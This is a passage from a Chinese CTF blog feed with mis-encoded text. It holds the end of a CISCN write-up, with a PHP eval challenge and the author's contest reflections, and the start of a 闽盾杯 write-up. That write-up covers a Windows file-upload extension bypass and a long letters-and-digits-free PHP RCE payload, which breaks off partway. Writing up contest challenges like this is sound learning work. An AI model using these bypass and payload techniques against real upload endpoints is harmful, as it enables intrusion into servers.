å°„åˆ°å…¶å®ƒç½‘ç»œåŒºåŸŸã€‚</p><hr><h1 id="ezwp"><a href="#ezwp" class="headerlink" title="ezwp"></a>ezwp</h1><h2 id="BREAKï¼ˆéé¢„æœŸï¼‰"><a href="#BREAKï¼ˆéé¢„æœŸï¼‰" class="headerlink" title="BREAKï¼ˆéé¢„æœŸï¼‰"></a>BREAKï¼ˆéé¢„æœŸï¼‰</h2><p>webpwné¢˜</p><p>ç»™äº†ä¸ªmyphp.soå’Œindex.phpä»¥åŠdockerfile</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,A-Z,0-9&lt;>\?]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¯å¢ƒå˜é‡æ²¡åˆ ï¼Œflagå°±åœ¨phpinfoé‡Œ</p><hr><h1 id="æ‚è°ˆ"><a href="#æ‚è°ˆ" class="headerlink" title="æ‚è°ˆ"></a>æ‚è°ˆ</h1><p>æ•´ä¸ªæ¯”èµ›è¿‡ç¨‹éƒ½æŒºæŠ½è±¡çš„</p><p>åœ¨35åº¦çš„ç¯®çƒåœºé‡Œæ‰“8å°æ—¶ï¼Œäººå’Œç”µè„‘éƒ½å¾—çº¢æ¸©ã€‚å¥½çƒ­â€¦çƒ­å¾—æˆ‘è¦è¢«æ™’å¹²ï¼ˆï¼Ÿï¼‰äº†â€¦å°±ç®—æ²¡åŠ¨ä¹Ÿå¥½çƒ­å•Š~</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/20240624205821.jpg" alt="20240624205821"></p><p>ä½ åœ¨åŠä¸€ç§å¾ˆæ–°çš„awdpï¼Œæ—©ä¸Šæ‰“å››å°æ—¶çš„breakï¼Œä¸‹åˆå†æ‰“å››å°æ—¶çš„fixï¼Œé‚£æ—©ä¸Šä¸å°±ç­‰åŒäºåœ¨æ‰“ctfï¼Ÿ</p><p>å¼€åœºçš„ç¬¬ä¸€é¦–æ­Œï¼šæ­£åœ¨æ’­æ”¾â€”â€”æ˜¥æ—¥å½±.mp3</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240626171208678.png" alt="image-20240626171208678"></p><p>å¼€å±€pwnå’Œwebçš„é¢˜ç›®ä¸Šåäº†ä¸€é“ï¼Œè¿˜ä»¥ä¸ºwebä»€ä¹ˆæ—¶å€™ä¹Ÿç”¨äºŒè¿›åˆ¶æ–‡ä»¶è·‘äº†</p><p>ä¸è¿‡å±…ç„¶çœŸçš„æœ‰webpwnï¼Œå½“ç„¶fixä¸èƒ½ç”¨webçš„æ–¹æ³•fixï¼Œè™½ç„¶æˆ‘ä¹Ÿä¸æ˜ç™½ä¸ºä»€ä¹ˆè¦å¯¹ä¸€ä¸ªctfé¢˜æfixã€‚ã€‚ã€‚</p><p>åä¸œå—webçš„é¢˜ç›®éš¾åº¦è·Ÿåˆèµ›æ¯”çœŸçš„ä½å¤ªå¤šäº†ï¼Œè¿˜å¥½æ²¡javaï¼Œä¸ç„¶çœŸå¾—å¯„</p><p>ç„¶åæ˜¯ä¸€äº›éœ€è¦æ³¨æ„çš„äº‹ï¼š</p><ul><li>æœ¬åœ° vscode çš„commit IDä¼šç»å¸¸æ”¹å˜ï¼Œäºæ˜¯å»ºè®®åœ¨å¼€èµ›å½“å¤©è¿˜èƒ½è”ç½‘çš„æ—¶å€™å…ˆä¸‹è½½å¥½å¯¹åº”çš„sshè¿æ¥åŒ…</li><li>å¼€å‘å’Œå®‰å…¨ç¼ºä¸€ä¸å¯ï¼Œåˆ«attackå˜å˜åšç„¶åwafå†™ä¸åŠ¨ï¼ˆ</li></ul><p>æ¥ä¸‹æ¥å°±æ˜¯æ€è€ƒæ€ä¹ˆå‡†å¤‡å†³èµ›äº†ï¼Œå…ˆç«‹å‡ ä¸ªè¦å®Œæˆçš„ç›®æ ‡ï¼š</p><ul><li>CTFéƒ¨åˆ†ï¼šå› ä¸ºåˆ°ç°åœ¨hwé¢è¯•è¿ä¸ªç€è½éƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥è¯•å›¾ä¸€ä¸ªæœˆå†…è·Ÿç€<a href="https://github.com/Drun1baby/JavaSecurityLearning?tab=readme-ov-file">Drun1babyå¸ˆå‚…çš„javaå­¦ä¹ è·¯çº¿</a>æå®šjavaï¼ˆxï¼›ç„¶åæ˜¯å¤ç°ä¹‹å‰æ¯”èµ›å±¯ä¸‹çš„é¢˜ç›®ï¼Œé‚£äº›æ¯”èµ›çš„é¢˜ï¼Œå¾ˆéš¾ï¼Œä½†å¾—ä¼šï¼›è¿˜æœ‰å°‘åˆ·ç‚¹è§†é¢‘ï¼Œå¤šçœ‹çœ‹çŸ¥è¯†æ˜Ÿçƒ</li><li>æ¸—é€ï¼šæœ‰å·¨é­”åœ¨ï¼Œæ¸—é€å‹åŠ›ä¼šå°ä¸€ç‚¹ï¼Œä½†æ˜¯æˆ‘è‡ªå·±ä¹Ÿå¾—å»å­¦ä¸€ä¸‹å†…ç½‘ä»£ç†ï¼Œæ‰“æ‰“æ˜¥ç§‹äº‘å¢ƒå’Œvulhubï¼Œç„¶åå‡†å¤‡è‡ªå·±çš„æ¼æ´åº“ï¼Œè¿™ä¸ªä¼°è®¡å¾—å¤šçœ‹çœ‹ç‹—ä½¬çš„åšå®¢äº†</li><li>AWDï¼šå¸å–å¤§bå“¥çš„ç»éªŒï¼Œæå‰é€ è½®å­æ‰“æ‰¹é‡ï¼Œä¸ç„¶åˆ°æ—¶å€™æœ‰å’±æ€¥çš„ï¼›ç„¶åå°±æ˜¯è®°å¾—æŠŠjarå’ŒwaråŒ…æ‰“åŒ…æ˜ç™½ï¼ˆ</li><li>Buildï¼šï¼Ÿ</li><li>æœŸæœ«è€ƒï¼šåˆ«æŒ‚ï¼Œåˆ«æŒ‚ï¼Œåˆ«æŒ‚ï¼Œå†æŒ‚ä¸‹å»ä¼šä¼¼</li><li>æ•´ç‚¹é˜³é—´çš„ä½œæ¯å§å“¥ï¼Œæ”¾å‡äº†å°±åˆ«ç†¬å¤œäº†ï¼Œè¿˜æ˜¯äº«å—å½“ä¸‹é‡è¦ï¼</li><li>åˆ«æˆå¤©æƒ¦è®°å‡¹ä½ é‚£æ€»åŠ›æˆ˜&#x2F;æ·±æ¸Š&#x2F;è‚‰é¸½äº†ï¼Œè¿˜æœ‰å¾ˆå¤šäº‹æ²¡åšï¼Œæœ‰è¿™æ—¶é—´éƒ½èƒ½æ¨å‡ ä¸ªapäº†ï¼Œsteamä¸Šè¿˜æœ‰ä¸€å †galgameæ²¡æ¨å‘¢ï¼ˆï¼ˆ</li></ul><p><del>ä»€ä¹ˆï¼Œæˆ‘ä¸€ä¸ªæœˆæå®šè¿™äº›ï¼ŒçœŸçš„å‡çš„ï¼Ÿ</del></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;âš çƒ­å¼‚å¸¸âš &lt;/p&gt;
&lt;p&gt;åŠçš„å¾ˆå¥½ï¼Œä¸‹æ¬¡åˆ«åœ¨fjnuåŠäº†ï¼Œåˆ‡å‰²äº†ï¼ˆï¼ˆ&lt;/p&gt;
&lt;p&gt;&lt;del&gt;ç°åœ¨æ˜¯6æœˆ23å·æ—©ä¸Šçš„8ç‚¹36ï¼Œæ˜ŸæœŸå¤©ï¼›24å·ï¼Œé«˜ç­‰æ•°å­¦ï¼Œï¼ˆå·®ï¼‰ä¸€ç« æ²¡çœ‹ï¼Œ27å·ï¼Œæ¦‚ç‡è®ºï¼Œè¿˜è¡Œï¼Œè¿˜å‰©é¢˜æ²¡åšâ€¦æ¬¸è¿™èŒ¶æ­‡ä¸œè¥¿è¿˜æŒºå¤šww&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;æ˜¯webçš„wp&lt;/p&gt;
&lt;p&gt;ç”±æˆ‘å’Œ@Laffeyå…±åŒå®Œæˆï¼Œä¸ªäººå¯¹webçš„è¯„ä»·æ˜¯çº¯æ‹¼ç§¯ç´¯ï¼Œçº¿ä¸‹æ–­ç½‘æƒ…å†µä¸‹æœ‰ä¸€ä¸ªè‡ªå·±çš„æœ¬åœ°åšå®¢å¤ªé‡è¦äº†ï¼Œç„¶åå°±æ˜¯è€èµ›æ£é­…åŠ›æ—¶åˆ»ï¼ˆ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165857174.png&quot; alt=&quot;image-20240623165857174&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="çº¿ä¸‹èµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>2024é—½ç›¾æ¯-é»‘ç›¾èµ›é“CTFåˆèµ›-æœ¬ç§‘ç»„</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/</id>
    <published>2024-06-22T01:33:04.000Z</published>
    <updated>2024-07-09T16:39:12.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é‰´å®šä¸ºæ‰¾flagå¤§èµ›</p><p>ç¬¬äºŒå¹´äº†è¿˜æ˜¯è¿›ä¸å»çº¿ä¸‹ï¼Œåªé è‡ªå·±çœŸæ˜¯ä¸€ç‚¹ä¹Ÿæ‰“ä¸ç©¿å•Šã€‚ã€‚</p><p>å®˜æ–¹wpï¼š<a href="https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf">https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf</a></p><p>åˆç€å…¨æ˜¯543å‡ºçš„æ˜¯å§</p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="No-characters"><a href="#No-characters" class="headerlink" title="No characters"></a>No characters</h2><blockquote><p>windowsæ–‡ä»¶ä¸Šä¼  + æ— å­—æ¯æ•°å­—rce</p></blockquote><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">å‘Šè¯‰ä½ æˆ‘æ˜¯windowsåˆæ€ä¹ˆæ ·<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½</p><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622102314801.png" alt="image-20240622102314801"></p><p>æµ‹è¯•å‘ç°è¿‡æ»¤äº†ä¸€äº›åç¼€åï¼ŒåŒ…æ‹¬php</p><p>å› ä¸ºæ˜¯windowsç¯å¢ƒï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦åˆ©ç”¨windowsçš„ç‰¹æ€§æ¥ä¸Šä¼ æ–‡ä»¶</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/m0_68976043/article/details/136695554">https://blog.csdn.net/m0_68976043/article/details/136695554</a></p><p>è¿™æ ·ä¼ phpçš„é—®é¢˜å°±è§£å†³äº†</p><p>å…ˆä¼ å…¥ä¸€ä¸ªæ–‡ä»¶åä¸º<code>1.php:jpg</code></p><p>ç„¶åå†ä¼ å…¥ç¬¬äºŒä¸ªæ–‡ä»¶åä¸º<code>1.&lt;&lt;&lt;</code>ï¼Œæ­¤æ—¶å°±ç›¸å½“äºå†™å…¥äº†phpæ–‡ä»¶</p><p>ç„¶åæµ‹è¯•å‘ç°æ–‡ä»¶å†…å®¹ä¸èƒ½æœ‰å­—æ¯å’Œæ•°å­—ï¼Œå³æ— å­—æ¯æ•°å­—rce</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/poing/p/12831304.html">https://www.cnblogs.com/poing/p/12831304.html</a></p><p>å†™å…¥è‡ªå¢æ„é€ çš„payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token operator">==</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter 